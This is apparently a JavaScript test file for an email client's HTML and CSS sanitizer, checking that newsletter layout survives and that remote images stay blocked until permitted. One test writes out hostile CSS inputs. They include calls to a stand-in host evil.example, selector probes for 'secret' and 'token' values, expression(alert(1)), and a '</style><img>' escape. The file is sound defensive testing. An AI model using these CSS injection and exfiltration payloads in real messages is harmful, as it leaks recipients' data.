import assert from 'node:assert/strict';
import { test } from 'node:test';
import { sanitizeCss } from '../src/mail/css.js';
import { renderMessage, sanitizeMessage } from '../src/mail/sanitize.js';

test('newsletter styles, responsive rules and legacy table/image layout survive both sanitization passes', () => {
  const source = `<html><head><style>
    body.brand { margin:0; font-family:Arial,sans-serif; background-color:#eef2f6 }
    .newsletter { width:600px; border-collapse:collapse }
    .title { color:#123456; font-size:28px }
    @media only screen and (max-width:480px) { .newsletter {width:100%!important} .title{font-size:20px} }
  </style></head><body class="brand" bgcolor="#eef2f6"><center>
    <table class="newsletter" width="600" cellpadding="0" cellspacing="0" border="0" align="center" bgcolor="#ffffff" role="presentation">
    <tr><td valign="top" width="600" style="padding:24px;color:#123456;background-color:#ffffff">
    <h1 class="title">Business newsletter</h1><font face="Arial" color="#445566" size="3">Legacy text</font>
    <a class="cta" href="https://example.test" style="display:inline-block;padding:12px 24px;border-radius:6px;background-color:#123456;color:white;text-decoration:none">Shop now</a>
    <img class="logo" src="https://images.example.test/logo.png" width="120" height="40" style="display:block;border:0" alt="Brand logo">
    </td></tr></table></center></body></html>`;
  const cached = sanitizeMessage(source);
  for (const html of [
    cached.html,
    renderMessage(
      cached.html,
      (index) => `https://content.example.test/image?index=${index}`,
      cached.resources.length,
    ),
  ]) {
    assert.match(html, /<style>/);
    assert.match(html, /@media only screen and \(max-width:480px\)/);
    assert.match(html, /\.spindle-email-body\.brand/);
    assert.match(html, /width:100%!important/);
    assert.match(html, /cellpadding="0"/);
    assert.match(html, /bgcolor="#ffffff"/);
    assert.match(html, /font-family:Arial,sans-serif/);
    assert.match(html, /padding:24px/);
    assert.match(html, /class="cta"/);
    assert.match(html, /background-color:#123456/);
    assert.match(html, /width="120" height="40"/);
    assert.match(html, /<font face="Arial" color="#445566" size="3">/);
  }
  const blocked = renderMessage(cached.html, null, cached.resources.length);
  assert.match(blocked, /width:120px;height:40px/);
  assert.doesNotMatch(blocked, /<img|https:\/\/images.example.test/);
});

test('CSS images use message resources and remain blocked until permitted', () => {
  const cached =
    sanitizeMessage(`<style>.hero{background-image:url("https://images.example.test/hero.png");background-size:cover}</style>
    <table><tr><td background="https://images.example.test/hero.png" style="background-color:#abcdef">Hero</td></tr></table>`);
  assert.equal(cached.resources.length, 1);
  assert.doesNotMatch(cached.html, /https:\/\/images.example.test/);
  assert.match(cached.html, /spindle-image:0/);
  const blocked = renderMessage(cached.html, null, 1);
  assert.doesNotMatch(blocked, /url\(|spindle-image:|https:\/\//);
  assert.match(blocked, /background-color:#abcdef/);
  const allowed = renderMessage(
    cached.html,
    () => 'https://content.example.test/image?token=owned&index=0',
    1,
  );
  assert.match(allowed, /https:\/\/content.example.test\/image/);
  assert.doesNotMatch(allowed, /https:\/\/images.example.test/);
});

test('CSS cannot import resources, load fonts, probe grants, or escape into markup', () => {
  const source = `@import url(https://evil.example/import);@font-face{font-family:evil;src:url(https://evil.example/font)}
    img[src*="secret"], [style*="token"] {background:url(https://evil.example/probe)}
    .safe{color:red;behavior:url(evil.htc);-moz-binding:url(evil.xml);width:expression(alert(1));background-image:image-set("https://evil.example/image" 1x);cursor:url(https://evil.example/cursor),auto}
    @media screen{.nested{color:blue;background-image:u\\72l("https://images.example.test/escape.png")}}
    .commented{background:u/**/rl(https://evil.example/comment)}
    .fallback{--image:u\\000072l("https://images.example.test/fallback.png");background-image:var(--image)}`;
  const cached = sanitizeMessage(
    `<style>${source}</style><p class="safe">Newsletter</p>`,
  );
  const blocked = renderMessage(cached.html, null, cached.resources.length);
  assert.doesNotMatch(
    blocked,
    /@import|@font-face|evil\.example|expression\(|-moz-binding|behavior:|image-set|\[src|\[style|<script|url\(/i,
  );
  assert.match(blocked, /color:red/);
  assert.match(blocked, /color:blue/);
  assert.doesNotMatch(
    sanitizeCss('.x{color:red', () => null),
    /color/,
  );
  assert.equal(
    sanitizeCss('color:red} .injected{color:blue', () => null, true),
    '',
  );
  assert.doesNotMatch(
    sanitizeCss('.a{font-family:"</style><img src=x>"}', () => null),
    /<\/style|<img/,
  );
});
